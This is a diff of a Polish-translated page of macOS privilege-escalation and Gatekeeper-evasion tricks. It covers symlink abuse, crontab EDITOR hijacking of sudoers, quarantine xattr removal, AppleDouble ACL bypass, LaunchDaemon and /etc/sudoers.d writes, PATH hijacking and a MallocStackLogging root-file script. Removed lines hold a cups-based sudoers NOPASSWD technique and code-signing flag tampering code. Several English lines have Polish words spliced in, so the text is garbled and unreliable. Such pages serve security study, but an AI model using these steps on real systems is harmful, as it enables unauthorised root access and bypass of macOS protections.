@@ -30,15 +30,9 @@ Przykład w: [https://theevilbit.github.io/posts/exploiting_directory_permission
 
 ## Link symboliczny / Link twardy
 
-### Umożliwiony plik/folder
-
 Jeśli uprzywilejowany proces zapisuje dane w **pliku**, który mógłby być **kontrolowany** przez **użytkownika o niższych uprawnieniach**, lub który mógłby być **wcześniej utworzony** przez użytkownika o niższych uprawnieniach. Użytkownik mógłby po prostu **wskazać go na inny plik** za pomocą linku symbolicznego lub twardego, a uprzywilejowany proces zapisze w tym pliku.
 
 Sprawdź w innych sekcjach, gdzie atakujący mógłby **wykorzystać dowolny zapis do eskalacji uprawnień**.
-
-### Otwórz `O_NOFOLLOW`
-
-Flaga `O_NOFOLLOW` używana przez funkcję `open` nie będzie podążać za linkiem symbolicznym w ostatnim komponencie ścieżki, ale będzie podążać za resztą ścieżki. Prawidłowy sposób zapobiegania podążaniu za linkami symbolicznymi w ścieżce to użycie flagi `O_NOFOLLOW_ANY`.
 
 ## .fileloc
 
@@ -56,25 +50,21 @@ Przykład:
 </dict>
 </plist>
 ```
-## Deskryptory plików
+## Arbitrary FD
 
-### Wycieki FD (brak `O_CLOEXEC`)
+Jeśli możesz sprawić, że **proces otworzy plik lub folder z wysokimi uprawnieniami**, możesz nadużyć **`crontab`**, aby otworzyć plik w `/etc/sudoers.d` z **`EDITOR=exploit.py`**, dzięki czemu `exploit.py` uzyska FD do pliku w `/etc/sudoers` i go nadużyje.
 
-Jeśli wywołanie `open` nie ma flagi `O_CLOEXEC`, deskryptor pliku zostanie odziedziczony przez proces potomny. Tak więc, jeśli proces z uprawnieniami otworzy plik z uprawnieniami i wykona proces kontrolowany przez atakującego, atakujący **odziedziczy FD do pliku z uprawnieniami**.
+Na przykład: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)
 
-Jeśli możesz sprawić, aby **proces otworzył plik lub folder z wysokimi uprawnieniami**, możesz nadużyć **`crontab`**, aby otworzyć plik w `/etc/sudoers.d` z **`EDITOR=exploit.py`**, dzięki czemu `exploit.py` uzyska FD do pliku w `/etc/sudoers` i go nadużyje.
+## Avoid quarantine xattrs tricks
 
-Na przykład: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098), kod: https://github.com/gergelykalman/CVE-2023-32428-a-macOS-LPE-via-MallocStackLogging
-
-## Unikaj sztuczek z xattrs kwarantanny
-
-### Usuń to
+### Remove it
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 ### uchg / uchange / uimmutable flag
 
-Jeśli plik/folder ma ten atrybut niemutowalny, nie będzie możliwe dodanie xattr do niego.
+Jeśli plik/folder ma ten atrybut niezmienności, nie będzie możliwe dodanie do niego xattr.
 ```bash
 echo asd > /tmp/asd
 chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
@@ -122,7 +112,7 @@ ls -le /tmp/test
 
 Format pliku **AppleDouble** kopiuje plik wraz z jego ACEs.
 
-W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana w xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w dekompresowanym pliku. Więc, jeśli skompresujesz aplikację do pliku zip w formacie **AppleDouble** z ACL, który uniemożliwia zapisanie innych xattrs... xattr kwarantanny nie został ustawiony w aplikacji:
+W [**kodzie źródłowym**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) można zobaczyć, że tekstowa reprezentacja ACL przechowywana w xattr o nazwie **`com.apple.acl.text`** zostanie ustawiona jako ACL w dekompresowanym pliku. Więc, jeśli skompresujesz aplikację do pliku zip w formacie pliku **AppleDouble** z ACL, który uniemożliwia zapisanie innych xattrs... xattr kwarantanny nie został ustawiony w aplikacji:
 
 Sprawdź [**oryginalny raport**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) po więcej informacji.
 
@@ -152,28 +142,7 @@ Nie jest to naprawdę potrzebne, ale zostawiam to na wszelki wypadek:
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## Ominięcie kontroli podpisów
-
-### Ominięcie kontroli binarnych platform
-
-Niektóre kontrole bezpieczeństwa sprawdzają, czy binarny plik jest **binarnym plikiem platformy**, na przykład, aby umożliwić połączenie z usługą XPC. Jednak, jak pokazano w omijaniu w https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, możliwe jest ominięcie tej kontroli, uzyskując binarny plik platformy (tak jak /bin/ls) i wstrzykując exploit za pomocą dyld, używając zmiennej środowiskowej `DYLD_INSERT_LIBRARIES`.
-
-### Ominięcie flag `CS_REQUIRE_LV` i `CS_FORCED_LV`
-
-Możliwe jest, aby wykonywany binarny plik zmodyfikował swoje własne flagi, aby ominąć kontrole za pomocą kodu takiego jak:
-```c
-// Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
-int pid = getpid();
-NSString *exePath = NSProcessInfo.processInfo.arguments[0];
-
-uint32_t status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
-status |= 0x2000; // CS_REQUIRE_LV
-csops(pid, 9, &status, 4); // CS_OPS_SET_STATUS
-
-status = SecTaskGetCodeSignStatus(SecTaskCreateFromSelf(0));
-NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, status);
-```
-## Ominięcie Podpisów Kodów
+## Ominięcie Podpisów Kodu
 
 Bundles zawierają plik **`_CodeSignature/CodeResources`**, który zawiera **hash** każdego pojedynczego **pliku** w **bundle**. Należy zauważyć, że hash CodeResources jest również **osadzony w wykonywalnym**, więc nie możemy tego zepsuć.
 
@@ -278,41 +247,21 @@ Napisz dowolny **LaunchDaemon** jak **`/Library/LaunchDaemons/xyz.hacktricks.pri
 </dict>
 </plist>
 ```
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+Just generate the script `/Applications/Scripts/privesc.sh` with the **komendy** you would like to run as root.
 
 ### Sudoers File
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+If you have **dowolny zapis**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
 
 ### PATH files
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **komenda without the full path**, you might be able to **przejąć** it modifying this file.
 
 You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
 
-### cups-files.conf
-
-Ta technika została użyta w [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).
-
-Create the file `/etc/cups/cups-files.conf` with the following content:
-```
-ErrorLog /etc/sudoers.d/lpe
-LogFilePerm 777
-<some junk>
-```
-To utworzy plik `/etc/sudoers.d/lpe` z uprawnieniami 777. Dodatkowy śmieć na końcu służy do wywołania utworzenia logu błędów.
-
-Następnie, zapisz w `/etc/sudoers.d/lpe` potrzebną konfigurację do eskalacji uprawnień, taką jak `%staff ALL=(ALL) NOPASSWD:ALL`.
-
-Następnie, zmodyfikuj plik `/etc/cups/cups-files.conf`, ponownie wskazując `LogFilePerm 700`, aby nowy plik sudoers stał się ważny, wywołując `cupsctl`.
-
-### Sandbox Escape
-
-Możliwe jest ucieczka z sandboxa macOS za pomocą FS arbitrary write. Dla niektórych przykładów sprawdź stronę [macOS Auto Start](../../../../macos-auto-start-locations.md), ale powszechnym przypadkiem jest zapisanie pliku preferencji Terminala w `~/Library/Preferences/com.apple.Terminal.plist`, który wykonuje polecenie przy starcie i wywołuje je za pomocą `open`.
-
 ## Generate writable files as other users
 
-To wygeneruje plik, który należy do roota, a który jest zapisywalny przeze mnie ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). To może również działać jako privesc:
+This will generate a file that belongs to root that is writable by me ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew_lpe.sh)). This might also work as privesc:
 ```bash
 DIRNAME=/usr/local/etc/periodic/daily
 
@@ -324,9 +273,9 @@ MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDont
 FILENAME=$(ls "$DIRNAME")
 echo $FILENAME
 ```
-## Pamięć współdzielona POSIX
+## POSIX Współdzielona Pamięć
 
-**Pamięć współdzielona POSIX** pozwala procesom w systemach operacyjnych zgodnych z POSIX na dostęp do wspólnej przestrzeni pamięci, co ułatwia szybszą komunikację w porównaniu do innych metod komunikacji międzyprocesowej. Polega to na tworzeniu lub otwieraniu obiektu pamięci współdzielonej za pomocą `shm_open()`, ustawianiu jego rozmiaru za pomocą `ftruncate()` oraz mapowaniu go w przestrzeni adresowej procesu za pomocą `mmap()`. Procesy mogą następnie bezpośrednio odczytywać i zapisywać w tej przestrzeni pamięci. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często stosuje się mechanizmy synchronizacji, takie jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają pamięć współdzieloną za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. Ten system jest szczególnie skuteczny w przypadku efektywnej, szybkiej IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.
+**POSIX współdzielona pamięć** pozwala procesom w systemach operacyjnych zgodnych z POSIX na dostęp do wspólnej przestrzeni pamięci, co ułatwia szybszą komunikację w porównaniu do innych metod komunikacji międzyprocesowej. Polega to na tworzeniu lub otwieraniu obiektu współdzielonej pamięci za pomocą `shm_open()`, ustawianiu jego rozmiaru za pomocą `ftruncate()` oraz mapowaniu go do przestrzeni adresowej procesu za pomocą `mmap()`. Procesy mogą następnie bezpośrednio odczytywać i zapisywać do tej przestrzeni pamięci. Aby zarządzać równoczesnym dostępem i zapobiegać uszkodzeniu danych, często stosuje się mechanizmy synchronizacji, takie jak mutexy lub semafory. Na koniec procesy odmapowują i zamykają współdzieloną pamięć za pomocą `munmap()` i `close()`, a opcjonalnie usuwają obiekt pamięci za pomocą `shm_unlink()`. Ten system jest szczególnie skuteczny w przypadku efektywnej, szybkiej IPC w środowiskach, w których wiele procesów musi szybko uzyskiwać dostęp do współdzielonych danych.
 
 <details>
 
